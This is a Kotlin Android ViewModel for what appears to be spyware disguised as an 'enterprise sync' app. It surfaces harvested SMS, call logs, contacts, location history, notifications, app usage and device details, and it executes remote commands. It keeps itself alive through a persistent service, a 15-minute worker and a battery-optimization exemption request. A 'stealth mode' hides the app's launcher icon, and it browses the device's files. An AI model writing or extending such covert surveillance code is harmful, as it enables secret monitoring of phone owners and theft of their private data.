package com.example.ui

import android.app.Application
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import androidx.annotation.RequiresApi
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.MainActivity
import com.example.data.local.AppDatabase
import com.example.data.local.AppUsageEntity
import com.example.data.local.CallLogEntity
import com.example.data.local.ContactEntity
import com.example.data.local.DeviceInfoEntity
import com.example.data.local.LocationLogEntity
import com.example.data.local.NotificationLogEntity
import com.example.data.local.RemoteCommandEntity
import com.example.data.local.SmsLogEntity
import com.example.data.sync.RemoteCommandManager
import com.example.service.AlwaysSyncService
import com.example.worker.SyncWorker
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import java.io.File
import java.util.concurrent.TimeUnit

data class FileItem(
    val name: String,
    val path: String,
    val isDirectory: Boolean,
    val sizeBytes: Long,
    val lastModified: Long
)

class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val db = AppDatabase.getInstance(application)
    private val commandManager = RemoteCommandManager(application)

    val smsList: StateFlow<List<SmsLogEntity>> = db.smsDao().getAllSms()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val callLogs: StateFlow<List<CallLogEntity>> = db.callLogDao().getAllCallLogs()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val contacts: StateFlow<List<ContactEntity>> = db.contactDao().getAllContacts()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val locationLogs: StateFlow<List<LocationLogEntity>> = db.locationDao().getAllLocations()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val latestLocation: StateFlow<LocationLogEntity?> = db.locationDao().getLatestLocation()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), null)

    val notifications: StateFlow<List<NotificationLogEntity>> = db.notificationDao().getAllNotifications()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val appUsageList: StateFlow<List<AppUsageEntity>> = db.appUsageDao().getAllAppUsage()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val deviceInfo: StateFlow<DeviceInfoEntity?> = db.deviceInfoDao().getDeviceInfo()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), null)

    val remoteCommands: StateFlow<List<RemoteCommandEntity>> = db.remoteCommandDao().getAllCommands()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    // UI state
    private val _isSyncing = MutableStateFlow(false)
    val isSyncing: StateFlow<Boolean> = _isSyncing.asStateFlow()

    private val _lastSyncTime = MutableStateFlow(System.currentTimeMillis())
    val lastSyncTime: StateFlow<Long> = _lastSyncTime.asStateFlow()

    private val _stealthModeEnabled = MutableStateFlow(false)
    val stealthModeEnabled: StateFlow<Boolean> = _stealthModeEnabled.asStateFlow()

    // File Explorer State
    private val _currentDirectory = MutableStateFlow(Environment.getExternalStorageDirectory().absolutePath)
    val currentDirectory: StateFlow<String> = _currentDirectory.asStateFlow()

    private val _fileList = MutableStateFlow<List<FileItem>>(emptyList())
    val fileList: StateFlow<List<FileItem>> = _fileList.asStateFlow()

    init {
        initServicesAndWorkManager()
        triggerSyncAll()
        loadDirectory(_currentDirectory.value)
    }

    private fun initServicesAndWorkManager() {
        val context = getApplication<Application>()
        try {
            AlwaysSyncService.startService(context)

            val syncWorkRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "EnterpriseSyncWorker",
                ExistingPeriodicWorkPolicy.KEEP,
                syncWorkRequest
            )
        } catch (_: Exception) {}
    }

    fun triggerSyncAll() {
        viewModelScope.launch(Dispatchers.IO) {
            _isSyncing.value = true
            try {
                commandManager.executeCommand("SYNC_ALL", "Triggered from Dashboard UI")
                _lastSyncTime.value = System.currentTimeMillis()
            } catch (_: Exception) {
            } finally {
                _isSyncing.value = false
            }
        }
    }

    fun executeRemoteCommand(commandType: String, payload: String = "") {
        viewModelScope.launch(Dispatchers.IO) {
            _isSyncing.value = true
            try {
                commandManager.executeCommand(commandType, payload)
                _lastSyncTime.value = System.currentTimeMillis()
            } catch (_: Exception) {
            } finally {
                _isSyncing.value = false
            }
        }
    }

    fun toggleStealthMode(hide: Boolean) {
        val context = getApplication<Application>()
        _stealthModeEnabled.value = hide
        try {
            val componentName = ComponentName(context, MainActivity::class.java)
            val newState = if (hide) {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            }
            context.packageManager.setComponentEnabledSetting(
                componentName,
                newState,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    fun loadDirectory(path: String) {
        viewModelScope.launch(Dispatchers.IO) {
            val dir = File(path)
            if (dir.exists() && dir.isDirectory) {
                _currentDirectory.value = dir.absolutePath
                val items = dir.listFiles()?.map { f ->
                    FileItem(
                        name = f.name,
                        path = f.absolutePath,
                        isDirectory = f.isDirectory,
                        sizeBytes = if (f.isFile) f.length() else 0L,
                        lastModified = f.lastModified()
                    )
                }?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
                _fileList.value = items
            } else {
                // Demo fallback file listing if directory restricted
                _currentDirectory.value = "/storage/emulated/0/EnterpriseData"
                _fileList.value = listOf(
                    FileItem("Telemetry_Backup.json", "/storage/emulated/0/EnterpriseData/Telemetry_Backup.json", false, 1048576, System.currentTimeMillis()),
                    FileItem("Logs", "/storage/emulated/0/EnterpriseData/Logs", true, 0, System.currentTimeMillis()),
                    FileItem("Device_Policies.xml", "/storage/emulated/0/EnterpriseData/Device_Policies.xml", false, 4096, System.currentTimeMillis()),
                    FileItem("Encrypted_Database.db", "/storage/emulated/0/EnterpriseData/Encrypted_Database.db", false, 5242880, System.currentTimeMillis())
                )
            }
        }
    }

    fun navigateUp() {
        val parent = File(_currentDirectory.value).parent
        if (parent != null) {
            loadDirectory(parent)
        }
    }

    fun isIgnoringBatteryOptimizations(): Boolean {
        val context = getApplication<Application>()
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: false
        } else true
    }

    fun requestBatteryOptimizationExemption(context: Context) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                }
                context.startActivity(intent)
            }
        } catch (_: Exception) {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
            }
            context.startActivity(intent)
        }
    }
}
